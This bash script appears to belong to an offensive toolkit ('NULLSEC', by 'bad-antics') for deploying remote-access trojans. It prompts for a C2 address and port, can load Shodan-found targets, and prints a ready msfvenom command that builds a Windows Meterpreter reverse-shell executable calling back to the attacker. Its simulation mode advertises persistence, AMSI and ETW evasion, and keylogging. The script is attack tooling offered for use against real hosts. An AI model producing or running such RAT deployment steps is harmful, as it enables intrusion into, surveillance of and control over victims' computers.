#!/bin/bash
# NULLSEC RAT Deploy - bad-antics development

# Source common library for Shodan integration

# === NULLSEC ENHANCED LOGGING ===
TARGET_DIR="${NULLSEC_TARGET_DIR:-$HOME/nullsec/logs/targets/default}"
LOG_FILE="${NULLSEC_LOG_FILE:-$TARGET_DIR/module.log}"

# Helper function: Log to file with timestamp
log_to_file() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Helper function: Save output to target directory
save_output() {
    local filename="$1"
    local content="$2"
    echo "$content" > "$TARGET_DIR/$filename"
    log_to_file "Saved output to $TARGET_DIR/$filename"
}

# Helper function: Log discovered vulnerability
log_vulnerability() {
    local severity="$1"
    local title="$2"
    local description="$3"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] VULNERABILITY [$severity] $title - $description" >> "$LOG_FILE"
}

# Read environment variables set by framework

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/nullsec-common.sh" 2>/dev/null

# Check for Shodan target
SHODAN_TARGET="/home/antics/nullsec/.shodan_target"
if [ -f "$SHODAN_TARGET" ]; then
    source "$SHODAN_TARGET"
    if [ ! -z "$TARGET" ]; then
        echo -e "${GREEN}[+]${RESET} Shodan target available: ${GREEN}$TARGET${RESET}"
    fi
fi

RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; CYAN='\033[1;36m'; WHITE='\033[1;37m'; DIM='\033[2m'; RESET='\033[0m'
clear
echo -e "${RED}▓▓▓ NULLSEC RAT DEPLOY ▓▓▓${RESET} ${CYAN}[ bad-antics ]${RESET}"
echo ""
echo -e "  ${YELLOW}RAT Type:${RESET} 1) Windows  2) Linux  3) Cross-platform"
read -p "$(echo -e ${WHITE}'  [>] Select [1-3]: '${RESET})" RAT_TYPE; [ -z "$RAT_TYPE" ] && RAT_TYPE="1"
read -p "$(echo -e ${WHITE}'  [>] C2 IP: '${RESET})" C2_IP; [ -z "$C2_IP" ] && C2_IP="192.168.1.100"
read -p "$(echo -e ${WHITE}'  [>] C2 Port: '${RESET})" C2_PORT; [ -z "$C2_PORT" ] && C2_PORT="4444"
read -p "$(echo -e ${WHITE}'  [>] Output filename: '${RESET})" OUTPUT; [ -z "$OUTPUT" ] && OUTPUT="payload"
read -p "$(echo -e ${YELLOW}'  [!] SIMULATION? (y/N): '${RESET})" TEST_MODE; TEST_MODE=${TEST_MODE:-n}
echo ""
if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
    echo -e "${YELLOW}[*]${RESET} Generating RAT payload"
    echo -e "${DIM}[*] Compiling payload for C2: $C2_IP:$C2_PORT${RESET}"; sleep 0.8
    echo -e "${GREEN}[+]${RESET} Persistence: Registry + Scheduled Task"
    echo -e "${GREEN}[+]${RESET} Evasion: AMSI bypass, ETW patch"
    echo -e "${GREEN}[+]${RESET} Features: Keylogger, Screenshot, FileManager"
    echo -e "${GREEN}[+]${RESET} Output: ${OUTPUT}.exe (384KB)"
    echo -e "${GREEN}[✓]${RESET} SIMULATION - Payload generated (simulated)"
else
    echo -e "${RED}[*]${RESET} Use msfvenom or custom builder:"
    echo -e "${DIM}    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$C2_IP LPORT=$C2_PORT -f exe -o $OUTPUT.exe${RESET}"
fi
